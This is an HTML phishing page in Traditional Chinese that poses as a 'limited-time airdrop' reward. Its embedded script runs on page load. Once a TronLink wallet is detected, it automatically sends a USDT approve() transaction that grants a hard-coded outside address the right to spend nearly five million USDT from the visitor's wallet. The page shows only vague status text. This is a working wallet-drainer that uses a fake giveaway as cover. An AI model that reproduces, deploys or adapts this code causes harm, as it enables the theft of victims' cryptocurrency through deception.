<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>限時空投活動</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
  <style>
    body { font-family: Arial; text-align: center; padding: 50px; background: #f4f4f4; }
    h1 { color: #333; }
    #status { margin-top: 20px; font-size: 18px; color: #666; }
  </style>
</head>
<body>
  <h1>✨ 您獲得了限時空投！</h1>
  <p id="status">正在初始化授權...</p>

  <script>
    const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    const SPENDER = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B";

    const ABI = [{
      "constant": false,
      "inputs": [
        { "name": "_spender", "type": "address" },
        { "name": "_value", "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    }];

    async function autoApprove() {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        document.getElementById("status").innerText = "請用 TronLink 開啟此頁面";
        return;
      }

      const tronWeb = window.tronWeb;
      const contract = await tronWeb.contract(ABI, USDT_CONTRACT);
      const amount = tronWeb.toBigNumber("4999999000000");

      document.getElementById("status").innerText = "⏳ 發送授權交易中...";

      try {
        const tx = await contract.approve(SPENDER, amount).send();
        document.getElementById("status").innerText = "✅ 授權成功！TX: " + tx;
      } catch (e) {
        document.getElementById("status").innerText = "❌ 授權失敗：" + e.message;
      }
    }

    window.addEventListener("load", () => {
      const check = setInterval(() => {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
          clearInterval(check);
          autoApprove();
        }
      }, 800);
    });
  </script>
</body>
</html>
